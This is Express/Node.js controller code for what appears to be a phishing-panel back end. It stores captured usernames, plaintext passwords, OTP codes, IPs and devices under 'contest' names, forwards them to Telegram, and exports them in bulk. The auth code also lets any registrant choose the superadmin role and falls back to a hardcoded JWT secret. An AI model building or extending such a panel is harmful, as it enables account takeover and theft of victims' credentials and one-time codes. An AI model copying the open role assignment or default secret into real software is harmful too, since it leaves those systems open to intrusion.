// controllers/authController.js
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const User = require('../models/User');
const ActivityLog = require('../models/ActivityLog');
const { body, validationResult } = require('express-validator');

class AuthController {
  // Register new user
  async register(req, res) {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
      }

      const { name, email, password, role } = req.body;

      // Check if user already exists
      const existingUser = await User.findOne({ email });
      if (existingUser) {
        return res.status(400).json({ message: 'Email already registered' });
      }

      // Set default permissions based on role
      let permissions = [];
      switch (role) {
        case 'superadmin':
          permissions = ['read', 'write', 'approve', 'delete', 'manage_users', 'system_settings'];
          break;
        case 'manager':
          permissions = ['read', 'write', 'approve', 'delete'];
          break;
        case 'editor':
          permissions = ['read', 'write'];
          break;
      }

      const user = new User({
        name,
        email,
        password,
        role,
        permissions
      });

      await user.save();

      // Log activity
      await ActivityLog.create({
        user: user._id,
        action: 'User Registration',
        entity: 'User',
        entityId: user._id,
        details: `New ${role} account created`,
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      });

      res.status(201).json({
        message: 'User created successfully',
        user: {
          id: user._id,
          name: user.name,
          email: user.email,
          role: user.role
        }
      });
    } catch (error) {
      console.error('Registration error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Login user
  async login(req, res) {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
      }

      const { email, password } = req.body;

      // Find user and include password for comparison
      const user = await User.findOne({ email }).select('+password');
      if (!user) {
        return res.status(400).json({ message: 'Invalid credentials' });
      }

      // Check password
      const isMatch = await user.comparePassword(password);
      if (!isMatch) {
        return res.status(400).json({ message: 'Invalid credentials' });
      }

      // Check if user is active
      if (user.status !== 'active') {
        return res.status(400).json({ message: 'Account is deactivated' });
      }

      // Generate JWT token
      const token = jwt.sign(
        { userId: user._id },
        process.env.JWT_SECRET || 'your-secret-key',
        { expiresIn: '24h' }
      );

      // Update last login
      user.lastLogin = new Date();
      await user.save();

      // Log activity
      await ActivityLog.create({
        user: user._id,
        action: 'User Login',
        entity: 'User',
        entityId: user._id,
        details: 'Successful login',
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      });

      res.json({
        message: 'Login successful',
        token,
        user: {
          id: user._id,
          name: user.name,
          email: user.email,
          role: user.role,
          permissions: user.permissions
        }
      });
    } catch (error) {
      console.error('Login error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Get current user profile
  async getProfile(req, res) {
    try {
      const user = await User.findById(req.user._id).select('-password');
      res.json({ user });
    } catch (error) {
      console.error('Get profile error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Update user profile
  async updateProfile(req, res) {
    try {
      const { name, email } = req.body;
      const user = await User.findById(req.user._id);

      if (name) user.name = name;
      if (email) user.email = email;

      await user.save();

      // Log activity
      await ActivityLog.create({
        user: user._id,
        action: 'Profile Update',
        entity: 'User',
        entityId: user._id,
        details: 'Updated profile information',
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      });

      res.json({
        message: 'Profile updated successfully',
        user: {
          id: user._id,
          name: user.name,
          email: user.email,
          role: user.role
        }
      });
    } catch (error) {
      console.error('Update profile error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Change password
  async changePassword(req, res) {
    try {
      const { currentPassword, newPassword } = req.body;
      const user = await User.findById(req.user._id).select('+password');

      // Verify current password
      const isMatch = await user.comparePassword(currentPassword);
      if (!isMatch) {
        return res.status(400).json({ message: 'Current password is incorrect' });
      }

      // Update password
      user.password = newPassword;
      await user.save();

      // Log activity
      await ActivityLog.create({
        user: user._id,
        action: 'Password Change',
        entity: 'User',
        entityId: user._id,
        details: 'Password changed successfully',
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      });

      res.json({ message: 'Password changed successfully' });
    } catch (error) {
      console.error('Change password error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Logout (client-side token removal, but we can log it)
  async logout(req, res) {
    try {
      // Log activity
      await ActivityLog.create({
        user: req.user._id,
        action: 'User Logout',
        entity: 'User',
        entityId: req.user._id,
        details: 'User logged out',
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      });

      res.json({ message: 'Logout successful' });
    } catch (error) {
      console.error('Logout error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }
}

module.exports = new AuthController();

// controllers/loginRecordController.js
const LoginRecord = require('../models/LoginRecord');
const ActivityLog = require('../models/ActivityLog');
const telegramService = require('../services/telegramService');
const notificationService = require('../services/notificationService');
const { validationResult } = require('express-validator');

class LoginRecordController {
  // Get all login records with pagination and filters
  async getAll(req, res) {
    try {
      const { 
        page = 1, 
        limit = 10, 
        status, 
        contestName, 
        search,
        startDate,
        endDate 
      } = req.query;

      // Build filter object
      const filter = {};
      if (status) filter.status = status;
      if (contestName) filter.contestName = { $regex: contestName, $options: 'i' };
      if (search) {
        filter.$or = [
          { username: { $regex: search, $options: 'i' } },
          { contestName: { $regex: search, $options: 'i' } },
          { ipAddress: { $regex: search, $options: 'i' } }
        ];
      }
      if (startDate || endDate) {
        filter.createdAt = {};
        if (startDate) filter.createdAt.$gte = new Date(startDate);
        if (endDate) filter.createdAt.$lte = new Date(endDate);
      }

      // Calculate pagination
      const skip = (page - 1) * limit;
      const total = await LoginRecord.countDocuments(filter);

      // Get records
      const records = await LoginRecord.find(filter)
        .populate('createdBy', 'name email')
        .sort({ createdAt: -1 })
        .skip(skip)
        .limit(parseInt(limit));

      res.json({
        records,
        pagination: {
          current: parseInt(page),
          pages: Math.ceil(total / limit),
          total,
          limit: parseInt(limit)
        }
      });
    } catch (error) {
      console.error('Get login records error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Get single login record
  async getById(req, res) {
    try {
      const record = await LoginRecord.findById(req.params.id)
        .populate('createdBy', 'name email');

      if (!record) {
        return res.status(404).json({ message: 'Login record not found' });
      }

      res.json({ record });
    } catch (error) {
      console.error('Get login record error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Create new login record
  async create(req, res) {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
      }

      const recordData = {
        ...req.body,
        createdBy: req.user._id
      };

      const record = new LoginRecord(recordData);
      await record.save();

      // Auto-send to Telegram if configured
      try {
        await telegramService.sendLoginRecord(record, req.user);
      } catch (telegramError) {
        console.error('Failed to send to Telegram:', telegramError);
        // Don't fail the request if Telegram fails
      }

      // Log activity
      await ActivityLog.create({
        user: req.user._id,
        action: 'Create Login Record',
        entity: 'LoginRecord',
        entityId: record._id,
        details: `Created login record for ${record.username}`,
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      });

      // Populate created record for response
      await record.populate('createdBy', 'name email');

      res.status(201).json({
        message: 'Login record created successfully',
        record
      });
    } catch (error) {
      console.error('Create login record error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Update login record
  async update(req, res) {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
      }

      const record = await LoginRecord.findById(req.params.id);
      if (!record) {
        return res.status(404).json({ message: 'Login record not found' });
      }

      // Store old values for activity log
      const oldValues = record.toObject();

      // Update record
      Object.assign(record, req.body);
      await record.save();

      // Log activity
      await ActivityLog.create({
        user: req.user._id,
        action: 'Update Login Record',
        entity: 'LoginRecord',
        entityId: record._id,
        details: `Updated login record for ${record.username}`,
        ipAddress: req.ip,
        userAgent: req.get('User-Agent'),
        changes: {
          old: oldValues,
          new: record.toObject()
        }
      });

      await record.populate('createdBy', 'name email');

      res.json({
        message: 'Login record updated successfully',
        record
      });
    } catch (error) {
      console.error('Update login record error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Delete login record
  async delete(req, res) {
    try {
      const record = await LoginRecord.findById(req.params.id);
      if (!record) {
        return res.status(404).json({ message: 'Login record not found' });
      }

      await LoginRecord.findByIdAndDelete(req.params.id);

      // Log activity
      await ActivityLog.create({
        user: req.user._id,
        action: 'Delete Login Record',
        entity: 'LoginRecord',
        entityId: record._id,
        details: `Deleted login record for ${record.username}`,
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      });

      res.json({ message: 'Login record deleted successfully' });
    } catch (error) {
      console.error('Delete login record error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Send notification for single record
  async sendNotification(req, res) {
    try {
      const { email = true, sms = true } = req.body;
      const record = await LoginRecord.findById(req.params.id)
        .populate('createdBy');

      if (!record) {
        return res.status(404).json({ message: 'Login record not found' });
      }

      // Send notification
      const result = await notificationService.sendLoginNotification(
        record,
        record.createdBy,
        { email, sms }
      );

      res.json({
        message: 'Notification sent successfully',
        result
      });
    } catch (error) {
      console.error('Send notification error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Send Telegram message for single record
  async sendTelegram(req, res) {
    try {
      const { chatId } = req.body;
      const record = await LoginRecord.findById(req.params.id);

      if (!record) {
        return res.status(404).json({ message: 'Login record not found' });
      }

      // Send to Telegram
      const result = await telegramService.sendLoginRecord(record, req.user);

      res.json({
        message: 'Telegram message sent successfully',
        result
      });
    } catch (error) {
      console.error('Send Telegram error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Bulk send notifications
  async bulkSendNotifications(req, res) {
    try {
      const { recordIds, email = true, sms = true } = req.body;

      if (!recordIds || !Array.isArray(recordIds)) {
        return res.status(400).json({ message: 'Record IDs array required' });
      }

      // Get records with users
      const records = await LoginRecord.find({ _id: { $in: recordIds } })
        .populate('createdBy');

      if (records.length === 0) {
        return res.status(404).json({ message: 'No records found' });
      }

      // Extract unique users
      const users = [...new Map(
        records.map(r => [r.createdBy._id.toString(), r.createdBy])
      ).values()];

      // Send bulk notifications
      const results = await notificationService.sendBulkNotifications(
        records,
        users,
        { email, sms }
      );

      res.json({
        message: 'Bulk notifications sent',
        results,
        processed: records.length
      });
    } catch (error) {
      console.error('Bulk send notifications error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Bulk send Telegram
  async bulkSendTelegram(req, res) {
    try {
      const { recordIds, format = 'detailed' } = req.body;

      if (!recordIds || !Array.isArray(recordIds)) {
        return res.status(400).json({ message: 'Record IDs array required' });
      }

      const records = await LoginRecord.find({ _id: { $in: recordIds } });

      if (records.length === 0) {
        return res.status(404).json({ message: 'No records found' });
      }

      // Send bulk to Telegram
      const result = await telegramService.sendBulkLoginRecords(records, req.user);

      res.json({
        message: 'Bulk Telegram messages sent successfully',
        result,
        processed: records.length
      });
    } catch (error) {
      console.error('Bulk send Telegram error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Export records to Excel
  async exportToExcel(req, res) {
    try {
      const { status, contestName, startDate, endDate } = req.query;

      // Build filter
      const filter = {};
      if (status) filter.status = status;
      if (contestName) filter.contestName = contestName;
      if (startDate || endDate) {
        filter.createdAt = {};
        if (startDate) filter.createdAt.$gte = new Date(startDate);
        if (endDate) filter.createdAt.$lte = new Date(endDate);
      }

      // Get records
      const records = await LoginRecord.find(filter)
        .populate('createdBy', 'name email')
        .sort({ createdAt: -1 });

      // Prepare data for Excel
      const excelData = records.map(record => ({
        'Contest Name': record.contestName,
        'Username': record.username,
        'Password': record.password,
        'OTP Code': record.otpCode,
        'IP Address': record.ipAddress,
        'Device': record.device,
        'Status': record.status,
        'Created At': record.createdAt.toISOString(),
        'Created By': record.createdBy.name
      }));

      // Log activity
      await ActivityLog.create({
        user: req.user._id,
        action: 'Export Login Records',
        entity: 'LoginRecord',
        details: `Exported ${records.length} login records`,
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      });

      res.json({
        message: 'Records exported successfully',
        data: excelData,
        count: records.length
      });
    } catch (error) {
      console.error('Export records error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }

  // Get statistics
  async getStatistics(req, res) {
    try {
      const { period = '7d' } = req.query;
      
      // Calculate date range
      const endDate = new Date();
      const startDate = new Date();
      
      switch (period) {
        case '24h':
          startDate.setHours(startDate.getHours() - 24);
          break;
        case '7d':
          startDate.setDate(startDate.getDate() - 7);
          break;
        case '30d':
          startDate.setDate(startDate.getDate() - 30);
          break;
        default:
          startDate.setDate(startDate.getDate() - 7);
      }

      // Get statistics
      const stats = await LoginRecord.aggregate([
        {
          $match: {
            createdAt: { $gte: startDate, $lte: endDate }
          }
        },
        {
          $group: {
            _id: '$status',
            count: { $sum: 1 }
          }
        }
      ]);

      // Format results
      const result = {
        total: 0,
        success: 0,
        failed: 0,
        pending: 0
      };

      stats.forEach(stat => {
        result.total += stat.count;
        result[stat._id] = stat.count;
      });

      res.json({ statistics: result });
    } catch (error) {
      console.error('Get statistics error:', error);
      res.status(500).json({ message: 'Server error' });
    }
  }
}

module.exports = new LoginRecordController();